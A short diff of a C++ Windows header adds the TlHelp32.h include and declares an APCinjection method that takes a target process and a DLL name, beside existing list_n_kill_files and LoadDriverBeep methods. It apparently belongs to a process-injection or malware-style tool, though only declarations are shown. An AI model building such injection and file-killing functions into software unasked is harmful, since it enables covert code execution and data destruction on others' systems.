@@ -17,6 +17,7 @@
 #include <locale> 
 #include <codecvt>
 #include <tchar.h>
+#include <TlHelp32.h>
 
 #include <AccCtrl.h>
 #include <AclAPI.h>
@@ -28,5 +29,6 @@ public:
 	void SetFilePermission(LPCWSTR filename);
 	vector<wstring> list_n_kill_files(wstring path);
 	void LoadDriverBeep();
+	BOOL APCinjection(string target, TCHAR *dll_name);
 };
 
